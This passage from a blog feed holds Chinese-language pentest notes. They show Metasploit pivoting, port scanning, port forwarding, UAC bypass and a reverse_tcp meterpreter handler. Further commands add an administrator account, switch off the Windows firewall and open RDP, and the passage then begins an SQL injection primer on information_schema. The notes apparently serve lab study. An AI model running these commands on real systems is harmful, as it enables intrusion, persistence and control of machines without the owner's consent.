class="number">4</span></span><br></pre></td></tr></table></figure><p>删除指定的路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 10.10.10.0&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h4><p>进去内网之后，我们使用相关模块进行主机发现。</p><h5 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; show options</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set threads 10</span><br><span class="line">threads &#x3D;&gt; 10</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set RHOSTS 172.18.0.2-100</span><br><span class="line">RHOSTS &#x3D;&gt; 172.18.0.2-100</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set PORTS 3306,8022</span><br><span class="line">PORTS &#x3D;&gt; 3306,8022</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] 172.18.0.3:           - 172.18.0.3:3306 - TCP OPEN</span><br><span class="line">[+] 172.18.0.2:           - 172.18.0.2:8022 - TCP OPEN</span><br><span class="line">[*] 172.18.0.2-100:       - Scanned 10 of 99 hosts (10% complete)</span><br></pre></td></tr></table></figure><h5 id="ARP扫描"><a href="#ARP扫描" class="headerlink" title="ARP扫描"></a>ARP扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;arp_scanner</span><br></pre></td></tr></table></figure><h4 id="Metasploit-Portfwd（端口转发-重定向）"><a href="#Metasploit-Portfwd（端口转发-重定向）" class="headerlink" title="Metasploit Portfwd（端口转发/重定向）"></a>Metasploit Portfwd（端口转发/重定向）</h4><p>在活动的Meterpreter会话中，键入<strong>portfwd -h</strong>将显示命令的各种选项和参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line">OPTIONS:</span><br><span class="line">     -L &gt;opt&gt;  要监听的本地主机（可选）。</span><br><span class="line">     -h        帮助横幅。</span><br><span class="line">     -l &gt;opt&gt;  要监听的本地端口。</span><br><span class="line">     -p &gt;opt&gt;  要连接的远程端口</span><br><span class="line">     -r &gt;opt&gt;  要连接的远程主机</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>Options：选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。</span><br><span class="line"></span><br><span class="line">-h：显示以上信息。</span><br><span class="line"></span><br><span class="line">-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。</span><br><span class="line"></span><br><span class="line">-p：TCP连接将转发到的端口。</span><br><span class="line"></span><br><span class="line">-r：连接被中继到的IP地址（目标）。</span><br></pre></td></tr></table></figure><p> Arguments：参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Add：该参数用于创建转发。</span><br><span class="line"></span><br><span class="line">Delete：这将从我们的转发端口列表中删除先前的条目。</span><br><span class="line"></span><br><span class="line">List：这将列出当前转发的所有端口。</span><br><span class="line"></span><br><span class="line">Flush：这将删除我们的转发列表中的所有端口。</span><br></pre></td></tr></table></figure><p>例子：</p><p>Add参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r  [target host]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。</span><br><span class="line">-l 3389是本地端口，将被监听并转发到我们的目标。这可以是您的机器上的任何端口，只要它尚未被使用。</span><br><span class="line">-p 3389是我们的定向主机上的目标端口。</span><br><span class="line">-r [target host]是我们的目标系统的IP或主机名。</span><br></pre></td></tr></table></figure><p>List参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd list</span><br><span class="line">0: 0.0.0.0:3389 -&gt; 172.16.194.191:3389</span><br><span class="line">1: 0.0.0.0:1337 -&gt; 172.16.194.191:1337</span><br><span class="line">2: 0.0.0.0:2222 -&gt; 172.16.194.191:2222</span><br><span class="line">3 total local port forwards.</span><br></pre></td></tr></table></figure><h4 id="Windows权限提升"><a href="#Windows权限提升" class="headerlink" title="Windows权限提升"></a>Windows权限提升</h4><ul><li><p>绕过UAC</p><p>bypassuac</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">或者</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;set target 1</span><br><span class="line">set target  1         #设置目标系统类型，1是64位，0是32位</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac  #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection  #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。</span><br></pre></td></tr></table></figure><p>RunAs绕过</p><p>创建一个可执行文件，目标机会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择“是”，就会触发返回一个高权限的meterpreter shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="Windows渗透"><a href="#Windows渗透" class="headerlink" title="Windows渗透"></a>Windows渗透</h4><h5 id="cmd与3389"><a href="#cmd与3389" class="headerlink" title="cmd与3389"></a>cmd与3389</h5><ul><li>监听木马</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; chcp 65001</span><br><span class="line">[-] Unknown command: chcp.</span><br><span class="line">msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 172.20.10.3</span><br><span class="line">LHOST &#x3D;&gt; 172.20.10.3</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 1234</span><br><span class="line">LPORT &#x3D;&gt; 1234</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.20.10.3:1234</span><br><span class="line">[*] Sending stage (176195 bytes) to 172.20.10.6</span><br><span class="line">[*] Meterpreter session 1 opened (172.20.10.3:1234 -&gt; 172.20.10.6:6198) at 2020-09-05 12:31:20 +0800</span><br></pre></td></tr></table></figure><ul><li>获取当前权限以及提权</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: GOD\Administrator</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>切换cmdshell，注意切换之后cmdshell与msf的会话具有相同的权限</p><ul><li>添加用户并加入管理员组</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net user steady111 125219gxaGXA &#x2F;add</span><br><span class="line">net user steady111 125219gxaGXA &#x2F;add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net localgroup administrators steady111 &#x2F;add</span><br><span class="line">net localgroup administrators steady111 &#x2F;add</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><ul><li><p>开启关闭防火墙</p><p>windows2003之前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启防火墙：</span><br><span class="line">netsh firewall set opmode mode&#x3D;enable</span><br><span class="line">关闭防火墙：</span><br><span class="line">netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure><p>windows2003之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure></li></ul><ul><li>开启3389</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"> </span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br><span class="line">&quot; 2&gt;&amp;1</span><br></pre></td></tr></table></figure><ul><li>检查3389是否开放</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server</span><br><span class="line"></span><br><span class="line">1表示关闭0表示开放</span><br><span class="line"></span><br><span class="line">fDenyTSConnections    REG_DWORD    0x1</span><br></pre></td></tr></table></figure><ul><li>查看远程桌面服务所在的端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</span><br></pre></td></tr></table></figure><h5 id="MSF与3389"><a href="#MSF与3389" class="headerlink" title="MSF与3389"></a>MSF与3389</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp  #开启远程桌面</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662  #将3389端口转发到6662</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br><span class="line">run getgui -f 6661 –e</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Metasploit使用&quot;&gt;&lt;a href=&quot;#Metasploit使用&quot; class=&quot;headerlink&quot; title=&quot;Metasploit使用&quot;&gt;&lt;/a&gt;Metasploit使用&lt;/h1&gt;&lt;h3 id=&quot;基础常用命令&quot;&gt;&lt;a href=&quot;#基础常用命令&quot;</summary>
      
    
    
    
    <category term="内网安全" scheme="http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网" scheme="http://s1eady.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>SQL--SQL注入漏洞</title>
    <link href="http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-22T14:46:26.000Z</published>
    <updated>2020-11-10T07:51:52.387Z</updated>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当前数据库用户、数据库中的表等信息，也可以读取敏感文件、写入服务器shell，进而获取主机权限。</p><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>MySQL 5.0以上版本。</p><p>数据库</p><ul><li><p><strong>information_schema</strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息。</p></li></ul><p>表</p><ul><li><p><strong>SCHEMATA</strong></p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等。</p></li><li><p><strong>TABLES</strong></p><p>提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。</p></li><li><p><strong>COLUMNS</strong></p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table <span class="keyword">and</span> column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| Tables_in_information_schema          |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| TABLES                                |</span><br><span class="line">| SCHEMATA                              |</span><br><span class="line">| COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| COLUMNS                               |</span><br><span class="line">mysql&gt; desc TABLES;</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field           | Type                | Null | Key | Default | Extra |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG   | varchar(<span class="number">512</span>)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA    | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME      | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_TYPE      | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| ENGINE          | varchar(<span class="number">64</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| VERSION         | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| ROW_FORMAT      | varchar(<span class="number">10</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_ROWS      | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AVG_ROW_LENGTH  | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_LENGTH     | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| MAX_DATA_LENGTH | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| INDEX_LENGTH    | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_FREE       | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AUTO_INCREMENT  | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| UPDATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| CHECK_TIME      | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COLLATION | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| CHECKSUM        | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_OPTIONS  | varchar(<span class="number">255</span>)        | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COMMENT   | varchar(<span class="number">2048</span>)       | NO   |     |         |       |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">mysql&gt; desc COLUMNS;</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field                    | Type                | Null | Key | Default | Extra |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG            | varchar(<span class="number">512</span>)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA             | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME               | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_NAME              | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| ORDINAL_POSITION         | bigint(<span class="number">21</span>) unsigned | NO   |     | <span class="number">0</span>       |       |</span><br><span class="line">| COLUMN_DEFAULT           | longtext            | YES  |     | NULL    |       |</span><br><span class="line">| IS_NULLABLE              | varchar(<span class="number">3</span>)          | NO   |     |         |       |</span><br><span class="line">| DATA_TYPE                | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| CHARACTER_MAXIMUM_LENGTH | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CHARACTER_OCTET_LENGTH   | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| NUMERIC_PRECISION        | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| NUMERIC_SCALE            | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATETIME_PRECISION       | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CHARACTER_SET_NAME       | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| COLLATION_NAME           | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| COLUMN_TYPE              | longtext            | NO   |     | NULL    |       |</span><br><span class="line">| COLUMN_KEY               | varchar(<span class="number">3</span>)          | NO   |     |         |       |</span><br><span class="line">| EXTRA                    | varchar(<span class="number">30</span>)         | NO   |     |         |       |</span><br><span class="line">| PRIVILEGES               | varchar(<span class="number">80</span>)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_COMMENT           | varchar(<span class="number">1024</span>)       | NO   |     |         |       |</span><br><span class="line">| GENERATION_EXPRESSION    | longtext            | NO   |     | NULL    |       |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line"><span class="number">21</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><p>总结</p><p>MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">information_schema的表schemata中的列schema_name记录了所有数据库的名字</span><br><span class="line">information_schema的表tables中的列table_schema记录了所有数据库的名字</span><br><span class="line">information_schema的表tables中的列table_name记录了所有数据库的表的名字</span><br><span class="line">information_schema的表columns中的列table_schema记录了所有数据库的名字</span><br><span class="line">information_schema的表columns中的列table_name记录了所有数据库的表的名字</span><br><span class="line">information_schema的表columns中的列column_name记录了所有数据库的表的列的名字</span><br></pre></td></tr></table></figure><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="right、left函数"><a href="#right、left函数" class="headerlink" title="right、left函数"></a>right、left函数</h5><p><code>LEFT()</code>函数是一个字符串函数,它返回具有指定长度的字符串的左边部分，<strong>我们在注入的时候，前台可能会限制回显字段，这时候我们可以使用这两个函数</strong>。</p><p>right同理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| <span class="number">67890</span>                 |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">2</span>) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| <span class="number">90</span>                    |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select left(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+----------------------+</span><br><span class="line">| left(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+----------------------+</span><br><span class="line">| <span class="number">12345</span>                |</span><br><span class="line">+----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h5 